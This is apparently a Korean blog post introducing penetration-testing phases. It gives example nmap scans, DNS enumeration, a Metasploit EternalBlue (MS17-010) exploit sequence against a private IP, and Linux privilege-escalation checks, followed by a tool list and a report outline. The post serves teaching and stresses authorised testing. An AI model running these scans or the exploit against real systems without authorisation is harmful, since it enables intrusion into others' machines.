---
layout: post
title: "Test"
date: 2026-02-05
categories: [Security, Testing]
tags: [pentesting, kali-linux, ethical-hacking]
description: "모의 해킹 테스트의 기본 절차와 방법론을 소개합니다."
image: "/assets/img/posts/pentesting.jpg"
---

# 모의 해킹 가이드

모의 해킹(Penetration Testing)은 시스템의 보안 취약점을 찾기 위한 승인된 공격 시뮬레이션입니다.

## 테스트 단계

### 1. 정찰 (Reconnaissance)
```bash
# Nmap 스캔
nmap -sV -sC -oA scan_results 192.168.1.0/24

# DNS 열거
dig example.com ANY
host -t ns example.com
```

### 2. 스캐닝
```bash
# 포트 스캔
nmap -p- --min-rate=1000 -T4 target.com

# 취약점 스캔
nmap --script vuln target.com
```

### 3. 접근 획득
```bash
# Metasploit 사용
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
exploit
```

### 4. 권한 상승
```bash
# Linux 권한 상승 체크
sudo -l
find / -perm -4000 2>/dev/null
```

## 주요 도구

- **Nmap**: 네트워크 스캐너
- **Burp Suite**: 웹 취약점 분석
- **Metasploit**: 익스플로잇 프레임워크
- **John the Ripper**: 패스워드 크래킹

## 보고서 작성

1. Executive Summary
2. 발견된 취약점 목록
3. 상세 분석
4. 재현 방법
5. 위험도 평가
6. 권장 조치사항

## 결론

모의 해킹은 반드시 승인 하에 수행되어야 하며, 윤리적 해킹 원칙을 준수해야 합니다.
